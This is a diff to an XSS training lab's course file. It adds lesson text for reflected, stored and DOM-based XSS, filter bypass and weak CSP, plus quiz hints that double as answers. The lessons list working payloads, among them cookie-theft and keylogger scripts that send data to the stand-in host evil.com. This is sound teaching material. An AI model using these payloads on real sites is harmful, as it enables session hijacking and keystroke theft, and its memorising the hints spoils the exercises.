@@ -4,46 +4,73 @@
   "tasks": {
     "1": {
       "title": "Reflected XSS: your code in the response",
+      "body": "## Reflected: the input comes back unwashed\n\nStart the lab and try:\n\n```bash\n# Normal\ncurl \"http://127.0.0.1:18082/hello?name=Ana\"\n# Response: <h1>Hello, Ana!</h1>\n\n# XSS: your input IS HTML/JS code\ncurl \"http://127.0.0.1:18082/hello?name=<script>alert('XSS')</script>\"\n# Response: <h1>Hello, <script>alert('XSS')</script>!</h1>\n```\n\nThe browser receives YOUR `<script>` as part of the legitimate HTML and **executes it**.\nAnyone who receives that link (with your payload in the URL) runs your code.\n\n## The search with a flag\n\nThe `/search?q=XSS` endpoint has a surprise:\n\n```bash\ncurl \"http://127.0.0.1:18082/search?q=XSS\"\n```\n\nLook for the flag in the message. The \"surprise\" in the output contains the flag — visible only\nwhen the search contains the right keyword.\n\n## Why it is dangerous in real life\n\nReflected XSS requires the VICTIM to click your malicious link. The attack:\n\n1. You send the victim: `http://victima.com/hello?name=<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>`\n2. The victim clicks → the browser runs your script\n3. Your script sends the victim's session cookies to your server\n4. With the cookie, you impersonate the victim\n\nThe mitigation: `html.escape()` in Python, `textContent` in JavaScript, CSP headers.\n\n## Retrieve the lab flag\n\nThe lab has a flag hidden in the /search endpoint. When you search for the\nword \"XSS\", the response contains the flag:\n```bash\ncurl \"http://127.0.0.1:18082/search?q=XSS\"\n```\nLook for the flag in the response body.",
       "questions": {
         "xss-reflejado-t01-q01": {
-          "prompt": "What HTML tag executes JavaScript in the browser?"
+          "prompt": "What HTML tag executes JavaScript in the browser?",
+          "hint": "<script>alert(1)</script>"
         },
         "xss-reflejado-t01-q02": {
-          "prompt": "What Python function sanitizes HTML (that this lab deliberately does NOT use)?"
+          "prompt": "What Python function SANITIZES HTML (and is deliberately NOT used by this lab)?",
+          "hint": "html.escape() from the html module."
+        },
+        "xss-reflejado-t01-q03": {
+          "prompt": "Search for 'XSS' in the lab's /search endpoint. Submit the flag.",
+          "hint": "curl http://127.0.0.1:18082/search?q=XSS"
         }
       }
     },
     "2": {
       "title": "Stored XSS: the poison that persists",
+      "body": "## Stored XSS: poison once, affect everyone\n\nThe lab has a **guestbook** (`/guestbook`). Try posting something:\n\n```bash\n# Normal post\ncurl \"http://127.0.0.1:18082/post?name=Hacker&message=Hola%20a%20todos\"\n\n# Post with XSS\ncurl \"http://127.0.0.1:18082/post?name=%3Cscript%3Ealert('Stored!')%3C/script%3E&message=Gotcha\"\n```\n\nNow ANYONE who visits `/guestbook` sees your `<script>` running. They don't need to\nclick any link — simply loading the page runs your code.\n\n## The guestbook flag\n\nThere is an \"admin\" entry in the guestbook with an internal message. Visit:\n\n```bash\ncurl \"http://127.0.0.1:18082/guestbook\"\n```\n\nLook for the admin's message. It contains **FLAG_2** — but in a real app it would be hidden\n(visible only to the admin). With an XSS payload that reads `document.body.innerHTML`, a\nregular user could see all of the content.\n\n## XSS payloads you should know\n\n```javascript\n// Classic\n<script>alert('XSS')</script>\n\n// Steal cookies\n<script>fetch('http://evil.com/steal?c='+document.cookie)</script>\n\n// Keylogger\n<script>document.onkeypress=function(e){fetch('http://evil.com/key?k='+e.key)}</script>\n\n// Defacement\n<script>document.body.innerHTML='<h1>Hacked</h1>'</script>\n\n// Basic filter bypass (without <script>)\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n<body onload=alert('XSS')>\n```\n\n## Retrieve the guestbook flag\n\nThe admin entry in the guestbook contains a flag. View all the entries:\n```bash\ncurl \"http://127.0.0.1:18082/guestbook\"\n```\nLook for the admin's message, which contains a flag.",
       "questions": {
         "xss-reflejado-t02-q01": {
-          "prompt": "Which type of XSS is MORE dangerous: reflected or stored?"
+          "prompt": "Which type of XSS is MORE dangerous: reflected or stored?",
+          "hint": "Stored XSS stays saved and affects everyone who views the page.",
+          "options": {
+            "a": "Reflected: it is more direct",
+            "b": "Stored: it runs automatically for EVERY visitor, no click needed",
+            "c": "They are equally dangerous",
+            "d": "Neither is dangerous over HTTPS"
+          }
         },
         "xss-reflejado-t02-q02": {
-          "prompt": "What document property is the classic target of an XSS payload?"
+          "prompt": "What JavaScript property (the one that gives access to the page's cookies) is the classic target of an XSS payload?",
+          "hint": "document.cookie — it steals the session."
+        },
+        "xss-reflejado-t02-q03": {
+          "prompt": "View the admin entry in the guestbook. Submit the hidden flag.",
+          "hint": "curl http://127.0.0.1:18082/guestbook"
         }
       }
     },
     "3": {
       "title": "Advanced XSS: DOM, filter bypass and CSP",
+      "body": "## The lab's 3 advanced vectors\n\n### 1. DOM-based XSS (/dom)\nThe site's own JavaScript puts `location.hash` into `innerHTML`:\n```text\nhttp://127.0.0.1:18093/dom#<img src=x onerror=alert(document.body.innerHTML)>\n```\nThe server NEVER sees your payload — everything happens in the user's browser.\n\n### 2. Filter bypass (/filtered)\nThe filter strips `<script>` but not other tags:\n```bash\ncurl \"http://127.0.0.1:18093/filtered?input=<img src=x onerror=alert(1)>\"\n# The filter does not block <img> — only <script>\n```\n\n### 3. Weak CSP (/csp)\nThe CSP header includes `'unsafe-inline'`, which allows inline scripts:\n```bash\ncurl -s http://127.0.0.1:18093/csp | grep Content-Security\n# script-src 'self' 'unsafe-inline' ← the gap\n```",
       "questions": {
         "xss-reflejado-t03-q01": {
-          "prompt": "What type of XSS occurs when the payload is processed in the BROWSER via JavaScript (not the server)?"
+          "prompt": "What type of XSS occurs when the payload is processed in the BROWSER via JavaScript (not on the server)?",
+          "hint": "DOM-based XSS — location.hash → innerHTML."
         },
         "xss-reflejado-t03-q02": {
-          "prompt": "What HTML tag executes JavaScript without using <script> and bypasses script-only filters?"
+          "prompt": "Which HTML tag, combined with the onerror event as in the lab, executes JavaScript without using <script> and bypasses filters that only block script?",
+          "hint": "<img src=x onerror=alert(1)>"
         },
         "xss-reflejado-t03-q03": {
-          "prompt": "Which CSP directive WEAKENS protection by allowing inline scripts?"
+          "prompt": "Which CSP directive WEAKENS protection by allowing inline scripts?",
+          "hint": "'unsafe-inline'"
         },
         "xss-reflejado-t03-q04": {
-          "prompt": "Open /dom with a payload in the hash (<img src=x onerror=...>) — the flag reveals when innerHTML executes. Submit it."
+          "prompt": "Open the lab's /dom with a payload in the hash (<img src=x onerror=...>) — the flag is revealed when the innerHTML runs. Submit it.",
+          "hint": "In the browser: http://127.0.0.1:18093/dom#<img src=x onerror=alert(1)> — or inspect the HTML the script is going to write"
         },
         "xss-reflejado-t03-q05": {
-          "prompt": "Bypass the /filtered filter with a tag other than <script> and submit the flag it displays."
+          "prompt": "Bypass the /filtered filter with a tag other than <script> and submit the flag it displays.",
+          "hint": "curl --globoff 'http://127.0.0.1:18093/filtered?input=<img src=x onerror=alert(1)>'"
         },
         "xss-reflejado-t03-q06": {
-          "prompt": "The /csp page serves its flag despite the CSP. Why? Look at it (curl -s http://127.0.0.1:18093/csp) and submit the flag."
+          "prompt": "The /csp page serves its flag despite the CSP. Why? Look at it (curl -s http://127.0.0.1:18093/csp) and submit the flag.",
+          "hint": "script-src 'self' 'unsafe-inline' — the unsafe-inline lets exactly this through"
         }
       }
     }
